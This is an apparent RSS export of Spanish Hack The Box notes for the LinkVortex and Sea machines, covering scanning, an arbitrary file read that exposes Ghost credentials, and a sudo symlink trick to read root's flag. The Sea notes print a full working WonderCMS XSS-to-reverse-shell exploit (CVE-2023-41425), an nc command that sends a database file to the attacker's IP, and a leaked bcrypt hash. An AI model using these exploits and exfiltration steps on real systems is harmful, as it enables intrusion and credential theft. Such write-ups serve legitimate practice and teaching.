<br><br><br><br><br>Update this Machine info]]></description><link>machines/heal/heal.html</link><guid isPermaLink="false">Machines/Heal/Heal.md</guid><pubDate>Sat, 25 Jan 2025 18:07:27 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/dcd5ef09ab764228c64385374ac744c1.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.hackthebox.com//storage/avatars/dcd5ef09ab764228c64385374ac744c1.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[00-index]]></title><description><![CDATA[ 
 <br>This is the structure of the machine folder<br><br><br><br><br><br><br><br><br><br>
<br>Text
<br>Text
<br><br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>
<br>...
]]></description><link>machines/linkvortex/00-index.html</link><guid isPermaLink="false">Machines/LinkVortex/00-index.md</guid><pubDate>Thu, 16 Jan 2025 09:19:37 GMT</pubDate></item><item><title><![CDATA[01-recon]]></title><description><![CDATA[ 
 <br>Template<br><br><br><br><br>Ports tcp open in nmap format<br><br>Ports services and versions nmap format<br><br>Ports UDP nmap format<br><br><br><br><br><br>
<br>Con el Arbitrary read file vemos el /etc/passwd
<br>file&gt; /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
file&gt; 

<br>Vemos que el usuario node existe en el sistema y tiene una bash shell;<br>Tambien sacamos el archivo  /var/lib/ghost/config.production.json que venia en el Dockerfile que sacamos de dev.linkvortex.htb<br>       │ File: Dockerfile.ghost
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ FROM ghost:5.58.0
   2   │ 
   3   │ # Copy the config
   4   │ COPY config.production.json /var/lib/ghost/config.production.json
   5   │ 
   6   │ # Prevent installing packages
   7   │ RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/
       │ dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
   8   │ 
   9   │ # Wait for the db to be ready first
  10   │ COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
  11   │ COPY entry.sh /entry.sh
  12   │ RUN chmod +x /var/lib/ghost/wait-for-it.sh
  13   │ RUN chmod +x /entry.sh
  14   │ 
  15   │ ENTRYPOINT ["/entry.sh"]
  16   │ CMD ["node", "current/index.js"]

<br>config.production.json<br>
Sacamos un nuevo correo y una direccion de puerto local donde se esta ejecutando un servicio , probablemente ghost:<br>file&gt; /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}

<br>Tenemos el usuario bob y su password <br><a data-tooltip-position="top" aria-label="mailto:bob@linkvortex.htb" rel="noopener nofollow" class="external-link" href="mailto:bob@linkvortex.htb" target="_blank">bob@linkvortex.htb</a>:fibber-talented-worth<br>Probamos ssh:<br>Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ whoami
bob

<br>]]></description><link>machines/linkvortex/01-recon.html</link><guid isPermaLink="false">Machines/LinkVortex/01-recon.md</guid><pubDate>Thu, 16 Jan 2025 09:29:31 GMT</pubDate></item><item><title><![CDATA[02-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/0xyassine/CVE-2023-40028/tree/master" target="_blank">https://github.com/0xyassine/CVE-2023-40028/tree/master</a>
<br><br><br><br><br>bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

<br>Clean_symlink.sh:<br>#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2&gt;/dev/null
    fi
  fi
fi

<br>tras varios intentos consigo que me haga el cat al archivo <br>bob@linkvortex:~$ nano /var/quarantined/g.png
bob@linkvortex:~$ sudo CHECK_CONTENT="true" /bin/bash /opt/ghost/clean_symlink.sh g.png 
bob@linkvortex:~$ ln -s hello.txt g.png
bob@linkvortex:~$ sudo CHECK_CONTENT="true" /bin/bash /opt/ghost/clean_symlink.sh g.png 
Link found [ g.png ] , moving it to quarantine
Content:
holaaaaa

<br>El metodo es creando un archivo en /var/quarantined con el contenido que se quiera leer previo a crear el symlynk y si la variable $CHECK_CONTENT es true entonces hace un cat al  QUAR_DIR/LINK_NAME<br>entonces<br>creamos un symlink de /root/root.txt a un archivo en quarentined<br>ln -s /root/root.txt /var/quarentined/noleer.txt
<br>Creamos un Symlink del noleer al directorio de usuario <br>ln -s /var/quarentined/noleer.txt noleer.png
<br>finalmente ejecutamos el script con sudo y marando $CHECK_CONTENT=true<br>bob@linkvortex:~$ sudo CHECK_CONTENT="true" /usr/bin/bash /opt/ghost/clean_symlink.sh noleer.png 
Link found [ noleer.png ] , moving it to quarantine
Content:
daa21fbc128199ee668e1b1bee29d6b9
<br><br>
<br>
<br>]]></description><link>machines/linkvortex/02-exploitation.html</link><guid isPermaLink="false">Machines/LinkVortex/02-exploitation.md</guid><pubDate>Thu, 16 Jan 2025 13:00:28 GMT</pubDate></item><item><title><![CDATA[03-post-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>
<br><br>
<br>
<br>]]></description><link>machines/linkvortex/03-post-exploitation.html</link><guid isPermaLink="false">Machines/LinkVortex/03-post-exploitation.md</guid><pubDate>Thu, 16 Jan 2025 09:19:37 GMT</pubDate></item><item><title><![CDATA[LinkVortex]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br><br> <img src="https://www.hackthebox.com//storage/avatars/97f12db8fafed028448e29e30be7efac.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 638
active:: True
name:: LinkVortex
os::Linux
user_flag:: True
root_flag:: True
difficulty_text:: Easy
stars:: 4.2
created:: 01/25/2025
published:: 12/07/24
avatar:: /storage/avatars/97f12db8fafed028448e29e30be7efac.png
tags:: 
<br><br><br><br><br>Update this Machine info]]></description><link>machines/linkvortex/linkvortex.html</link><guid isPermaLink="false">Machines/LinkVortex/LinkVortex.md</guid><pubDate>Sat, 25 Jan 2025 18:07:28 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/97f12db8fafed028448e29e30be7efac.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://www.hackthebox.com//storage/avatars/97f12db8fafed028448e29e30be7efac.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[00-index]]></title><description><![CDATA[ 
 <br>This is the structure of the machine folder<br><br><br><br><br><br><br><br><br><br>
<br>Text
<br>Text
<br><br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>
<br>...
]]></description><link>machines/sea/00-index.html</link><guid isPermaLink="false">Machines/Sea/00-index.md</guid><pubDate>Thu, 21 Nov 2024 12:36:49 GMT</pubDate></item><item><title><![CDATA[01-recon]]></title><description><![CDATA[ 
 <br><br>~ sudo nmap -Pn -n -vvv --min-rate 50000 -sS sea.htb -oN Openports
[sudo] password for cher0: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:31 CET
Initiating SYN Stealth Scan at 13:31
Scanning sea.htb (10.10.11.28) [1000 ports]
Discovered open port 80/tcp on 10.10.11.28
Discovered open port 22/tcp on 10.10.11.28
Increasing send delay for 10.10.11.28 from 0 to 5 due to 39 out of 128 dropped probes since last increase.
Discovered open port 8082/tcp on 10.10.11.28
Completed SYN Stealth Scan at 13:31, 0.63s elapsed (1000 total ports)
Nmap scan report for sea.htb (10.10.11.28)
Host is up, received user-set (0.099s latency).
Scanned at 2024-11-21 13:31:53 CET for 0s
Not shown: 893 closed tcp ports (reset), 104 filtered tcp ports (no-response)
PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack ttl 63
80/tcp   open  http            syn-ack ttl 63
8082/tcp open  blackice-alerts syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
           Raw packets sent: 2015 (88.660KB) | Rcvd: 897 (35.936KB)

<br><br>udo nmap -Pn -n -vvv --min-rate 50000 -sCV  -p 22,80,8082 sea.htb -oN recon/Attack      
[sudo] password for cher0: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:38 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Initiating SYN Stealth Scan at 13:38
Scanning sea.htb (10.10.11.28) [3 ports]
Discovered open port 80/tcp on 10.10.11.28
Discovered open port 8082/tcp on 10.10.11.28
Discovered open port 22/tcp on 10.10.11.28
Completed SYN Stealth Scan at 13:38, 0.31s elapsed (3 total ports)
Initiating Service scan at 13:38
Scanning 3 services on sea.htb (10.10.11.28)
Completed Service scan at 13:38, 6.49s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.28.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 2.19s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Nmap scan report for sea.htb (10.10.11.28)
Host is up, received user-set (0.27s latency).
Scanned at 2024-11-21 13:38:10 CET for 9s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
8082/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.65 seconds
           Raw packets sent: 3 (132B) | Rcvd: 3 (132B)

<br><br><br><br><br><br>Dirsearch
wfuzz
<br><br>
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/__24-11-21_13-51-56.txt

Target: http://sea.htb/

[13:51:56] Starting: 
[13:52:29] 301 -  232B  - /messages  -&gt;  http://sea.htb/messages/           
[13:52:34] 301 -  231B  - /plugins  -&gt;  http://sea.htb/plugins/           
[13:52:42] 301 -  230B  - /themes  -&gt;  http://sea.htb/themes/                  
<br>Direcciones interesantes:<br>/messages
/plugins
/themes
<br><br>Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/_plugins_24-11-21_14-02-43.txt

Target: http://sea.htb/

[14:02:43] Starting: plugins/
[14:02:52] 200 -    1KB - /plugins/404                                      
[14:02:55] 200 -    1KB - /plugins/admin/home                               
[14:03:11] 200 -    1KB - /plugins/home                                       
[14:03:28] 200 -    1KB - /plugins/sitecore/content/home                       
[14:03:30] 200 -    1KB - /plugins/sym/root/home/        
<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/_messages_24-11-21_14-41-36.txt

Target: http://sea.htb/

[14:41:36] Starting: messages/
[14:41:43] 200 -    1KB - /messages/404                                     
[14:41:46] 200 -    1KB - /messages/admin/home                              
[14:42:01] 200 -    1KB - /messages/home                                    
[14:42:14] 500 -    0B  - /messages/phpma/                                  
[14:42:24] 200 -    1KB - /messages/sitecore/content/home                   
[14:42:26] 200 -    1KB - /messages/sym/root/home/     
<br><br>
Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/_themes_24-11-21_14-50-36.txt

Target: http://sea.htb/

[14:50:36] Starting: themes/
[14:50:43] 404 -    3KB - /themes/Home                                      
[14:50:44] 200 -    1KB - /themes/home                                      
[14:50:49] 200 -    1KB - /themes/404                                       
[14:50:49] 301 -  236B  - /themes/shell  -&gt;  http://sea.htb/themes/shell/   
[14:51:08] 301 -  235B  - /themes/bike  -&gt;  http://sea.htb/themes/bike/     
[14:51:25] 404 -    3KB - /themes/HOME                                      
[14:51:56] 404 -    3KB - /themes/_home                                     
[14:52:02] 404 -  269B  - /themes/http%3A%2F%2Fwww 

#### /themes/bike

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220545

Output File: /home/cher0/HTB/Sea/reports/http_sea.htb/_themes_bike_24-11-21_14-53-32.txt

Target: http://sea.htb/

[14:53:32] Starting: themes/bike/                                                                                                                                          
[14:53:34] 301 -  239B  - /themes/bike/img  -&gt;  http://sea.htb/themes/bike/img/
[14:53:34] 200 -    1KB - /themes/bike/home                                 
[14:53:35] 200 -    6B  - /themes/bike/version  ##IMPORTANTE                 
[14:53:35] 404 -    3KB - /themes/bike/Home                                 
[14:53:36] 301 -  239B  - /themes/bike/css  -&gt;  http://sea.htb/themes/bike/css/
[14:53:37] 200 -   66B  - /themes/bike/summary   ##IMPORTANTE                
[14:53:39] 200 -    1KB - /themes/bike/404                                  
[14:53:44] 500 -    0B  - /themes/bike/398                                  
[14:53:44] 500 -    0B  - /themes/bike/1092                                 
[14:53:44] 500 -    0B  - /themes/bike/1701
[14:53:46] 200 -    1KB - /themes/bike/LICENSE                              
[14:54:10] 404 -    3KB - /themes/bike/HOME                                 
[14:54:42] 404 -    3KB - /themes/bike/_home            

<br>/themes/bike/summary<br>
Este directiorio nos muestra informacion sobre la version del CMS<br>
<img alt="Pasted image 20241121145410.png" src="machines/sea/sea-images/pasted-image-20241121145410.png"><br>
/themes/bike/summary/LICENSE<br>
<img alt="Pasted image 20241121145502.png" src="machines/sea/sea-images/pasted-image-20241121145502.png"><br>
Ahora buscamos en Github por el nombre del autor<br>
<img alt="Pasted image 20241121150235.png" src="machines/sea/sea-images/pasted-image-20241121150235.png"><br>Vemos que usa WOndweCMS en su version 3.2.0<br><br>Wonder Cms 3.2.0 es vulnerable a un RCE mediante un XSS <br><a data-tooltip-position="top" aria-label="https://github.com/insomnia-jacob/CVE-2023-41425" rel="noopener nofollow" class="external-link" href="https://github.com/insomnia-jacob/CVE-2023-41425" target="_blank">CVE-2023-41425</a><br>exploit:<br>import argparse
import os.path

# Colors
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'
yellow = '\033[93m'
reset = '\033[0m'


def arguments():
    global args
    parser = argparse.ArgumentParser()
    parser.add_argument( '-u', '--url', required=True, help='Enter the URL where the WonderCMS loginURL is located. e.g.: http://example.com/loginURL' )
    parser.add_argument( '-i', '--ip', required=True, help='Attacker IP address. e.g.: -i 127.0.0.1' )
    parser.add_argument( '-p', '--port', required=True, help='Listening port. e.g.: -p 4444' )
    parser.add_argument( '-r', '--remote-host', default='https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip', help='Specify the remote host where the main.zip file containing the compressed reverse shell is hosted: e.g.: http://192.168.0.23:8000/main.zip' )
    
    args = parser.parse_args()
    

def createData( url, ip, port, remote_host ):
    data = f'''
var url = "{ url }";
if (url.endsWith("/")) {{
    url = url.slice(0, -1);
}}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlObj = new URL(urlWithoutLog);
var urlWithoutLogBase = urlObj.origin + '/'; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase + "/?installModule={ remote_host }&amp;directoryName=violet&amp;type=themes&amp;token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {{
    if (xhr3.status == 200) {{
        var xhr4 = new XMLHttpRequest();
        xhr4.withCredentials = true;
        xhr4.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php");
        xhr4.send();
        xhr4.onload = function() {{
            if (xhr4.status == 200) {{
                var ip = "{ ip }";
                var port = "{ port }";
                var xhr5 = new XMLHttpRequest();
                xhr5.withCredentials = true;
                xhr5.open("GET", urlWithoutLogBase + "/themes/revshell-main/rev.php?lhost=" + ip + "&amp;lport=" + port);
                xhr5.send();
            }}
        }};
    }}
}};
'''
    return data


def createFileXSS( data ):
    try:
        with open( "xss.js", "w" ) as f:
            f.write( data )
    except:
        print('\n[!] An error occurred while trying to write the file!')

def printInfo():
    print(yellow, "\n[+]The zip file will be downloaded from the host: ", reset, f" { args.remote_host }")
    print(yellow, "\n[+] File created:", reset,"xss.js")
    print(yellow, "\n[+] Set up nc to listen on your terminal for the reverse shell")    
    print("\tUse:\n\t\t", reset, red, f"nc -nvlp { args.port }", reset)
    link = str(args.url).replace("loginURL","index.php?page=loginURL?")+"\"&gt;&lt;/form&gt;&lt;script+src=\"http://"+str(args.ip)+":8000/xss.js\"&gt;&lt;/script&gt;&lt;form+action=\""
    link = link.strip(" ")
    print(yellow, "\n[+] Send the below link to admin:\n\n\t", green + link, reset)

    print("\nStarting HTTP server with Python3, waiting for the XSS request")
    os.system("python3 -m http.server\n")
    
def main():
    arguments()
    createFileXSS( createData( args.url, args.ip, args.port, args.remote_host ) )
    printInfo()
    

if __name__ == '__main__':
    main()
<br>Visitamos la pagina /loginURL<br><img alt="Pasted image 20241121153213.png" src="machines/sea/sea-images/pasted-image-20241121153213.png"><br><br>Probamos el script:<br>➜  CVE-2023-41425 git:(main) ✗ python3 exploit.py -u http://sea.htb/loginURL -i 10.10.14.184 -p 4443 -r http://10.10.14.184:8000/main.zip
 
================================================================
        # Autor      : Insomnia (Jacob S.)
        # IG         : insomnia.py
        # X          : @insomniadev_
        # Github     : https://github.com/insomnia-jacob
================================================================          
 
[+]The zip file will be downloaded from the host:    http://10.10.14.184:8000/main.zip
 
[+] File created:  xss.js
 
[+] Set up nc to listen on your terminal for the reverse shell
        Use:
                   nc -nvlp 4443 
 
[+] Send the below link to admin:

         http://sea.htb/LOGINURL"&gt;&lt;/form&gt;&lt;script+src="http://10.10.14.184:8000/xss.js"&gt;&lt;/script&gt;&lt;form+action=" 

Starting HTTP server with Python3, waiting for the XSS request
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...



<br>Injectamos el XSS:<br>
<img alt="Pasted image 20241121152216.png" src="machines/sea/sea-images/pasted-image-20241121152216.png"><br><br><img alt="Pasted image 20241121153624.png" src="machines/sea/sea-images/pasted-image-20241121153624.png"><br><br>Pagina principal:<br><img alt="Pasted image 20241121134058.png" src="machines/sea/sea-images/pasted-image-20241121134058.png"><br><a rel="noopener nofollow" class="external-link" href="http://sea.htb/contact.php" target="_blank">http://sea.htb/contact.php</a><br><img alt="Pasted image 20241121134527.png" src="machines/sea/sea-images/pasted-image-20241121134527.png"><br><br>404:<br><br><img alt="Pasted image 20241121134217.png" src="machines/sea/sea-images/pasted-image-20241121134217.png"><br>]]></description><link>machines/sea/01-recon.html</link><guid isPermaLink="false">Machines/Sea/01-recon.md</guid><pubDate>Thu, 21 Nov 2024 14:36:38 GMT</pubDate><enclosure url="machines/sea/sea-images/pasted-image-20241121145410.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/sea/sea-images/pasted-image-20241121145410.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[02-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>
<br><a data-tooltip-position="top" aria-label="https://github.com/insomnia-jacob/CVE-2023-41425" rel="noopener nofollow" class="external-link" href="https://github.com/insomnia-jacob/CVE-2023-41425" target="_blank">CVE-2023-41425</a>     
<br>
<br><br><br><br>/var/www/<br>Encontramos database.js, me lo paso a mi maquina con nc<br>$ nc -w 3 10.10.14.184 4442 &lt; database.js
$ ls
cache.json
database.js
files
$ pwd
/var/www/sea/data
$ 

<br>database.js:<br>{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/11\/22 11:17:34": "127.0.0.1",
            "2024\/11\/22 11:16:03": "127.0.0.1",
            "2024\/11\/22 11:15:33": "127.0.0.1",
            "2024\/11\/22 11:14:03": "127.0.0.1",
            "2024\/11\/22 11:09:33": "127.0.0.1"
        },
        "lastModulesSync": "2024\/11\/22",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "&lt;center&gt;&lt;h1&gt;404 - Page not found&lt;\/h1&gt;&lt;\/center&gt;",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "&lt;h1&gt;Welcome to Sea&lt;\/h1&gt;\n\n&lt;p&gt;Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!&lt;\/p&gt;",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "&lt;h1&gt;How can I participate?&lt;\/h1&gt;\n&lt;p&gt;To participate, you only need to send your data as a participant through &lt;a href=\"http:\/\/sea.htb\/contact.php\"&gt;contact&lt;\/a&gt;. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.&lt;\/p&gt;",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "&lt;h2&gt;About&lt;\/h2&gt;\n\n&lt;br&gt;\n&lt;p&gt;We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.&lt;\/p&gt;"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
}
<br>Parece que tenemos un has (bpcrypt blowfish) que podemos desencriptar<br>Vamos a ver el /etc/passwd para saber que usuarios pueden loguearse:
<br>**root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
